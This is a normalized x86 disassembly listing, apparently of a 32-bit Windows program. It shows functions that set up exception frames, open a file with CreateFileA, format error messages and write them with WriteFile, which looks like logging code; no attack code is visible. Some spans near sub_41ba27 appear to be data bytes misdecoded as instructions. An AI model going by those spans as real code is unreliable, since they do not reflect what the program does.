mov eax rw-data
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
call sub_4c517c
mov [ ebp - 0x40 ] 0x2
lea edx [ ebp + 0x10 ]
lea eax [ ebp + 0x10 ]
call sub_4d3050
inc [ ebp - 0x40 ]
lea edx [ ebp + 0xc ]
mov [ ebp - 0x4c ] 0xc
lea eax [ ebp + 0xc ]
call sub_4d3050
inc [ ebp - 0x40 ]
xor edx edx
mov [ ebp - 0x4c ] 0x18
mov [ ebp - 0x4 ] edx
lea edx [ ebp - 0x4 ]
inc [ ebp - 0x40 ]
lea eax [ ebp + 0xc ]
call sub_4d33a0
mov [ ebp - 0x4c ] 0xc
mov [ ebp - 0x4c ] 0x24
mov edx rw-data
lea eax [ ebp - 0x8 ]
call sub_4d3010
inc [ ebp - 0x40 ]
lea edx [ ebp - 0x8 ]
lea eax [ ebp + 0x10 ]
call sub_4d324c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov edx rw-data
lea eax [ ebp - 0xc ]
call sub_4d3010
inc [ ebp - 0x40 ]
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_4d3394
test eax eax
lea eax [ ebp - 0xc ]
setg cl
and ecx 0x1
mov edx 0x2
push ecx
dec [ ebp - 0x40 ]
call sub_4d318c
pop ecx
test ecx ecx
jne r-xdata
push eax
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
pop ecx
test cl cl
je r-xdata
mov eax 0x1
mov [ ebp - 0x4c ] 0xc
xor ebx ebx
jmp r-xdata
push rw-data
push rw-data
call sub_41c394
add esp 0x8
lea ecx [ esi + 0x8 ]
mov eax [ ecx + 0x10 ]
test eax eax
jne r-xdata
mov eax [ ecx + 0x14 ]
mov edx [ ecx + 0x10 ]
sub eax edx
mov ecx 0xc
cdq
idiv ecx
mov edx eax
xor edx edx
jmp r-xdata
mov [ ebp - 0x4c ] 0x30
xor eax eax
mov edi ebx
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x10 ]
shl edi 0x2
inc [ ebp - 0x40 ]
mov eax [ esi + 0x18 ]
lea edi [ edi + edi * 2 ]
add eax edi
add eax 0x8
call sub_4d33a0
lea edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_4d3394
test eax eax
lea eax [ ebp - 0x10 ]
setg cl
and ecx 0x1
mov edx 0x2
push ecx
dec [ ebp - 0x40 ]
call sub_4d318c
pop ecx
test cl cl
je r-xdata
or eax 0xffffffff
mov edx 0x2
push eax
lea eax [ ebp - 0x4 ]
dec [ ebp - 0x40 ]
call sub_4d318c
dec [ ebp - 0x40 ]
lea eax [ ebp + 0xc ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x40 ]
lea eax [ ebp + 0x10 ]
mov edx 0x2
call sub_4d318c
pop eax
mov edx [ ebp - 0x5c ]
mov [ fs : 0x0 ] edx
cmp edx ebx
ja r-xdata
inc ebx
mov [ ebp - 0x4c ] 0x3c
xor eax eax
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax rw-data
inc [ ebp - 0x40 ]
mov edx [ esi + 0x18 ]
add edx edi
call sub_4d3564
lea edx [ ebp - 0x14 ]
push edx
mov edx rw-data
lea eax [ ebp - 0x18 ]
call sub_4d3010
inc [ ebp - 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
lea edx [ ebp - 0x18 ]
inc [ ebp - 0x40 ]
lea ecx [ ebp - 0x1c ]
pop eax
call sub_4d31c8
xor edx edx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] edx
push ecx
inc [ ebp - 0x40 ]
lea eax [ ebp - 0x1c ]
mov edx [ esi + 0x18 ]
pop ecx
add edx edi
add edx 0x8
call sub_4d31c8
lea eax [ ebp - 0x20 ]
push eax
mov edx rw-data
lea eax [ ebp - 0x24 ]
call sub_4d3010
inc [ ebp - 0x40 ]
xor eax eax
mov [ ebp - 0x28 ] eax
lea edx [ ebp - 0x24 ]
inc [ ebp - 0x40 ]
lea ecx [ ebp - 0x28 ]
pop eax
call sub_4d31c8
xor edx edx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x2c ] edx
push ecx
inc [ ebp - 0x40 ]
lea eax [ ebp - 0x28 ]
mov edx [ esi + 0x18 ]
pop ecx
add edx edi
add edx 0x4
call sub_4d31c8
lea eax [ ebp - 0x2c ]
push eax
mov edx rw-data
lea eax [ ebp - 0x30 ]
call sub_4d3010
inc [ ebp - 0x40 ]
xor eax eax
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x30 ]
inc [ ebp - 0x40 ]
lea ecx [ ebp - 0x34 ]
pop eax
call sub_4d31c8
lea edx [ ebp - 0x34 ]
lea eax [ ebp - 0x38 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x40 ]
lea edx [ ebp - 0x38 ]
inc [ ebp - 0x40 ]
mov eax [ edx ]
push eax
push rw-data
push 0x7b
push rw-data
push rw-data
call sub_41c2dc
add esp 0x14
dec [ ebp - 0x40 ]
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x38 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x34 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x30 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x24 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x40 ]
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4d318c
mov eax ebx
mov edx 0x2
push eax
lea eax [ ebp - 0x4 ]
dec [ ebp - 0x40 ]
call sub_4d318c
dec [ ebp - 0x40 ]
lea eax [ ebp + 0xc ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x40 ]
lea eax [ ebp + 0x10 ]
mov edx 0x2
call sub_4d318c
pop eax
mov edx [ ebp - 0x5c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b864
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x8 ] 0x3
lea edx [ ebp + 0x14 ]
lea eax [ ebp + 0x14 ]
call sub_4d3050
inc [ ebp - 0x8 ]
lea edx [ ebp + 0x10 ]
mov [ ebp - 0x14 ] 0xc
lea eax [ ebp + 0x10 ]
call sub_4d3050
inc [ ebp - 0x8 ]
lea edx [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
call sub_4d3050
inc [ ebp - 0x8 ]
lea edx [ ebp + 0xc ]
mov [ ebp - 0x14 ] 0x18
mov eax [ ebp + 0x8 ]
call sub_4d3050
inc [ ebp - 0x8 ]
lea edx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0x4
call sub_4d3050
inc [ ebp - 0x8 ]
lea edx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
add eax 0x8
call sub_4d3050
inc [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
lea eax [ ebp + 0xc ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x8 ]
lea eax [ ebp + 0x10 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x8 ]
lea eax [ ebp + 0x14 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_41b924
push ebp
mov ebp esp
add esp 0xffffffd4
mov eax rw-data
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
call sub_4c517c
test ebx ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
test edi edi
je r-xdata
test [ ebp + 0xc ] 0x1
je r-xdata
mov esi edi
mov [ ebp - 0x8 ] esi
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
push ebx
call sub_4b0180
pop ecx
mov edx [ ebp - 0x8 ]
mov ecx [ edx ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x1c ] 0x24
mov edx 0x3
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x1c ] 0xc
sub_41ba27
inc [ ecx ]
add [ eax ] al
add [ eax + eax + 0x50 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x74 ] dh
cmp bh [ fs : edx ]
popa
jne r-xdata
clc
je r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
mov cl [ esi ]
insb
je r-xdata
cmp al 0x43
insb
popad
jae r-xdata
jae r-xdata
call sub_41baf4
pop ecx
inc [ ebp - 0x8 ]
in al dx
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x14 ] 0xc
push rw-data
cmp dl [ ebx + edx * 2 + 0x74 ]
jb r-xdata
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
dec [ ebp - 0x8 ]
push 0x2
push rw-data
call sub_41bb44
add esp 0x8
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x3e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_41ba90
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x14 ] 0xc
push rw-data
call sub_41baf4
pop ecx
inc [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
sub_41bac4
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
dec [ ebp - 0x8 ]
push 0x2
push rw-data
call sub_41bb44
add esp 0x8
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
sub_41baf4
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x14 ] 0xc
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_41bb44
push ebp
mov ebp esp
add esp 0xffffffd8
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
test ebx ebx
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebx + 0x4 ]
test edx edx
je r-xdata
test [ ebp + 0xc ] 0x1
je r-xdata
mov [ ebp - 0x18 ] 0xc
mov edx rw-data
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
inc [ ebp - 0xc ]
mov edx [ eax ]
push edx
push rw-data
push 0x14
push rw-data
push rw-data
call sub_41c26c
add esp 0x14
dec [ ebp - 0xc ]
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov ecx [ ebx + 0x4 ]
push ecx
call CloseHandle
push ebx
call sub_4b0180
pop ecx
sub_41bbd4
push ebp
mov ebp esp
add esp 0xffffffb8
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
mov [ ebp - 0x38 ] 0x18
xor edx edx
mov eax [ rw-data ]
mov [ ebp - 0x8 ] edx
lea edx [ ebp - 0x8 ]
inc [ ebp - 0x2c ]
mov eax [ eax ]
call sub_482cb0
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
mov ecx [ edx ]
mov edx rw-data
push ecx
call sub_4d3010
inc [ ebp - 0x2c ]
mov edx [ eax ]
xor eax eax
mov [ ebp - 0x10 ] eax
lea ecx [ ebp - 0x10 ]
inc [ ebp - 0x2c ]
pop eax
call sub_435e74
lea edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x2c ]
inc [ ebp - 0x2c ]
dec [ ebp - 0x2c ]
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x2c ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x2c ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x38 ] 0xc
mov [ ebp - 0x38 ] 0x24
xor ecx ecx
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x20 ] ecx
push eax
inc [ ebp - 0x2c ]
lea eax [ ebp - 0x1c ]
mov edx rw-data
call sub_4d3010
inc [ ebp - 0x2c ]
mov edx [ eax ]
push edx
mov edx rw-data
lea eax [ ebp - 0x18 ]
call sub_4d3010
inc [ ebp - 0x2c ]
lea edx [ ebp - 0x4 ]
mov ecx [ eax ]
xor eax eax
push ecx
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
call sub_41e604
lea edx [ ebp - 0x14 ]
inc [ ebp - 0x2c ]
mov eax [ edx ]
pop edx
pop ecx
call sub_430a90
lea edx [ ebp - 0x20 ]
lea eax [ ebp - 0x24 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x2c ]
inc [ ebp - 0x2c ]
lea edx [ ebp - 0x24 ]
lea eax [ ebp - 0x4 ]
call sub_4d2758
dec [ ebp - 0x2c ]
dec [ ebp - 0x2c ]
lea eax [ ebp - 0x24 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x2c ]
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x2c ]
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x2c ]
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x2c ]
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp - 0x4 ]
push ecx
push ebx
call sub_41bd68
add esp 0x8
dec [ ebp - 0x2c ]
dec [ ebp - 0x2c ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov ecx [ ebp - 0x48 ]
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
sub_41bd68
push ebp
mov ebp esp
add esp 0xffffffd4
mov eax rw-data
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
call sub_4c517c
mov [ ebp - 0x10 ] 0x2
lea edx [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
call sub_4d2618
inc [ ebp - 0x10 ]
inc [ ebp - 0x10 ]
mov edx rw-data
mov [ ebp - 0x1c ] 0xc
mov [ ebp - 0x1c ] 0x18
lea eax [ ebp - 0x4 ]
call sub_4d3010
inc [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4d31b4
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x1c ] 0x24
mov edx rw-data
lea eax [ ebp - 0x8 ]
call sub_4d3010
inc [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4d31b4
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
push 0x0
push 0x0
push 0x2
push 0x0
push 0x5
push 0x40000000
mov ecx [ ebp + 0xc ]
test ecx ecx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
mov eax rw-data
jmp r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ esi - 0xa ]
cmp eax 0x2
jne r-xdata
push eax
call CreateFileA
mov edi eax
mov [ ebx + 0x4 ] edi
cmp edi 0xffffffff
jne r-xdata
dec [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea eax [ ebp + 0xc ]
xor edx edx
call sub_4d2728
mov ecx [ ebp - 0x2c ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebx + 0x4 ] eax
lea eax [ ebp + 0xc ]
call j_sub_44a5d8#2
lea edx [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
call sub_41e5d8
sub_41be7c
push ebp
mov ebp esp
add esp 0xffffffd4
mov eax rw-data
call sub_4c517c
push 0x0
lea edx [ ebp - 0x2c ]
push 0x0
push edx
push 0x400
call GetLastError
push eax
push 0x0
push 0x1300
call FormatMessageA
mov [ ebp - 0x18 ] 0xc
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x2c ]
call sub_4d3010
inc [ ebp - 0xc ]
mov [ ebp - 0x18 ] 0x18
mov ecx [ ebp - 0x2c ]
push ecx
call LocalFree
mov [ ebp - 0x18 ] 0x24
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
call sub_4d31b4
mov eax [ ebp + 0x8 ]
mov edx 0x2
mov [ ebp - 0x18 ] 0x30
push eax
lea eax [ ebp - 0x4 ]
dec [ ebp - 0xc ]
call sub_4d318c
pop eax
mov [ ebp - 0x18 ] 0x24
inc [ ebp - 0xc ]
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov esp ebp
pop ebp
retn
sub_41bf30
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
push esi
mov ebx [ ebp + 0x8 ]
call sub_4c517c
mov [ ebp - 0x8 ] 0x2
lea edx [ ebp + 0x1c ]
lea eax [ ebp + 0x1c ]
call sub_4d2618
inc [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov [ ebp - 0x14 ] 0xc
mov edx [ ebp + 0x1c ]
test edx edx
jne r-xdata
mov esi [ ebp + 0x1c ]
test esi esi
je r-xdata
mov ecx rw-data
jmp r-xdata
mov ecx [ ebp + 0x1c ]
movzx eax [ esi - 0xa ]
cmp eax 0x2
jne r-xdata
push ecx
mov edx [ ebp + 0x18 ]
push edx
mov eax [ ebp + 0x14 ]
push eax
mov edx [ ebp + 0x10 ]
push edx
mov ecx [ ebp + 0xc ]
push ecx
push ebx
call sub_41bfd4
add esp 0x18
dec [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
lea eax [ ebp + 0x1c ]
xor edx edx
call sub_4d2728
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp + 0x1c ]
call j_sub_44a5d8#2
lea edx [ ebp + 0x1c ]
lea eax [ ebp + 0x1c ]
call sub_41e5d8
sub_41bfd4
push ebp
mov ebp esp
add esp 0xfffffbc8
mov eax rw-data
push ebx
push esi
mov ebx [ ebp + 0x8 ]
call sub_4c517c
mov edx [ ebx + 0x4 ]
test edx edx
jne r-xdata
mov [ ebp - 0x1c ] 0x18
call sub_4d2e2c
fstp [ ebp - 0x34 ]
lea eax [ ebp - 0x34 ]
xor edx edx
mov [ ebp - 0x8 ] edx
lea edx [ ebp - 0x8 ]
inc [ ebp - 0x10 ]
call sub_4d2e38
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x10 ]
inc [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x1c ] 0xc
mov ecx [ ebp + 0x10 ]
push ecx
mov eax [ ebp + 0xc ]
push eax
mov edx [ ebp + 0x1c ]
push edx
mov ecx [ ebp + 0x18 ]
push ecx
mov eax [ ebp - 0x4 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x2c ]
mov [ fs : 0x0 ] ecx
mov eax ecx
jmp r-xdata
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov edx rw-data
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
movzx eax [ esi - 0xa ]
cmp eax 0x2
jne r-xdata
push edx
push rw-data
lea ecx [ ebp - 0x438 ]
push ecx
call sub_4c8520
add esp 0x1c
push 0x0
lea eax [ ebp - 0x38 ]
push eax
lea edx [ ebp - 0x438 ]
push edx
call sub_4c4e7c
pop ecx
push eax
lea ecx [ ebp - 0x438 ]
push ecx
mov eax [ ebx + 0x4 ]
push eax
call WriteFile
dec [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov ecx [ ebp - 0x2c ]
mov [ fs : 0x0 ] ecx
lea eax [ ebp - 0x4 ]
call j_sub_44a5d8#2
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_41e5d8
sub_41c0ec
push ebp
mov ebp esp
add esp 0xfffffbc8
mov eax rw-data
push ebx
push esi
mov ebx [ ebp + 0x8 ]
call sub_4c517c
mov edx [ ebx + 0x4 ]
test edx edx
jne r-xdata
mov [ ebp - 0x1c ] 0x18
call sub_4d2e2c
fstp [ ebp - 0x34 ]
lea eax [ ebp - 0x34 ]
xor edx edx
mov [ ebp - 0x8 ] edx
lea edx [ ebp - 0x8 ]
inc [ ebp - 0x10 ]
call sub_4d2e38
lea edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x10 ]
inc [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x1c ] 0xc
mov ecx [ ebp + 0x10 ]
push ecx
mov eax [ ebp + 0xc ]
push eax
mov edx [ ebp - 0x4 ]
test edx edx
jne r-xdata
mov ecx [ ebp - 0x2c ]
mov [ fs : 0x0 ] ecx
mov eax ecx
jmp r-xdata
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov ecx rw-data
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
movzx eax [ esi - 0xa ]
cmp eax 0x2
jne r-xdata
push ecx
push rw-data
lea edx [ ebp - 0x438 ]
push edx
call sub_4c8520
add esp 0x14
push 0x0
lea eax [ ebp - 0x38 ]
push eax
lea edx [ ebp - 0x438 ]
push edx
call sub_4c4e7c
pop ecx
push eax
lea ecx [ ebp - 0x438 ]
push ecx
mov eax [ ebx + 0x4 ]
push eax
call WriteFile
dec [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov ecx [ ebp - 0x2c ]
mov [ fs : 0x0 ] ecx
lea eax [ ebp - 0x4 ]
call j_sub_44a5d8#2
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_41e5d8
sub_41c1fc
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
mov [ ebp - 0x8 ] 0x2
lea edx [ ebp + 0x18 ]
lea eax [ ebp + 0x18 ]
call sub_4d2618
inc [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov [ ebp - 0x14 ] 0xc
mov edx [ ebp + 0x18 ]
push edx
push rw-data
mov ecx [ ebp + 0x14 ]
push ecx
mov eax [ ebp + 0x10 ]
push eax
mov edx [ ebp + 0xc ]
push edx
push ebx
call sub_41bf30
add esp 0x18
dec [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
lea eax [ ebp + 0x18 ]
xor edx edx
call sub_4d2728
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
sub_41c26c
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
mov [ ebp - 0x8 ] 0x2
lea edx [ ebp + 0x18 ]
lea eax [ ebp + 0x18 ]
call sub_4d2618
inc [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov [ ebp - 0x14 ] 0xc
mov edx [ ebp + 0x18 ]
push edx
push rw-data
mov ecx [ ebp + 0x14 ]
push ecx
mov eax [ ebp + 0x10 ]
push eax
mov edx [ ebp + 0xc ]
push edx
push ebx
call sub_41bf30
add esp 0x18
dec [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
lea eax [ ebp + 0x18 ]
xor edx edx
call sub_4d2728
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
sub_41c2dc
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
mov [ ebp - 0x8 ] 0x2
lea edx [ ebp + 0x18 ]
lea eax [ ebp + 0x18 ]
call sub_4d2618
inc [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov [ ebp - 0x14 ] 0xc
mov dl [ ebx ]
test dl dl
je r-xdata
dec [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
lea eax [ ebp + 0x18 ]
xor edx edx
call sub_4d2728
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x18 ]
push ecx
push rw-data
mov eax [ ebp + 0x14 ]
push eax
mov edx [ ebp + 0x10 ]
push edx
mov ecx [ ebp + 0xc ]
push ecx
push ebx
call sub_41bf30
add esp 0x18
sub_41c354
push ebp
mov ebp esp
add esp 0xfffffc00
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
push eax
mov edx [ ebp + 0xc ]
push edx
lea ecx [ ebp - 0x400 ]
push ecx
call sub_4c8548
add esp 0xc
lea eax [ ebp - 0x400 ]
push eax
push rw-data
push ebx
call sub_41c0ec
add esp 0xc
pop ebx
mov esp ebp
pop ebp
retn
sub_41c394
push ebp
mov ebp esp
add esp 0xfffffc00
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
mov dl [ ebx ]
test dl dl
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push eax
mov ecx [ ebp + 0xc ]
push ecx
lea eax [ ebp - 0x400 ]
push eax
call sub_4c8548
add esp 0xc
lea edx [ ebp - 0x400 ]
push edx
push rw-data
push ebx
call sub_41c0ec
add esp 0xc
sub_41c420
push ebp
mov ebp esp
add esp 0xffffffd8
test dl dl
push ebx
push esi
mov [ ebp - 0x8 ] dl
jle r-xdata
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov ecx esi
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40188c
add [ ebp - 0xc ] 0x11
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp - 0x4 ]
test bl bl
je r-xdata
call sub_4d369c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4d36a9
sub_41c480
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov edx rw-data
lea eax [ ebp - 0x4 ]
call sub_4d3010
inc [ ebp - 0xc ]
mov edx [ eax ]
mov eax [ ebx + 0x37c ]
call sub_48dfa0
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov eax ebx
call sub_47dde4
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
pop ebx
mov esp ebp
pop ebp
retn
sub_41c554
push ebp
mov ebp esp
add esp 0xffffffd8
test dl dl
push ebx
push esi
mov [ ebp - 0x8 ] dl
jle r-xdata
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov ecx esi
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_40188c
add [ ebp - 0xc ] 0x11
mov eax [ ebp - 0x4 ]
add eax 0x380
xor edx edx
mov [ eax ] edx
inc [ ebp - 0xc ]
inc [ ebp - 0xc ]
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
mov eax [ ebp - 0x4 ]
test bl bl
je r-xdata
call sub_4d369c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4d36a9
sub_41c5c8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov esi [ ebx + 0x37c ]
lea edi [ ebx + 0x380 ]
mov [ ebp - 0x18 ] 0xc
add esi 0x290
xor eax eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_41e604
lea ecx [ ebp - 0x4 ]
inc [ ebp - 0xc ]
mov edx [ ecx ]
mov eax [ esi ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
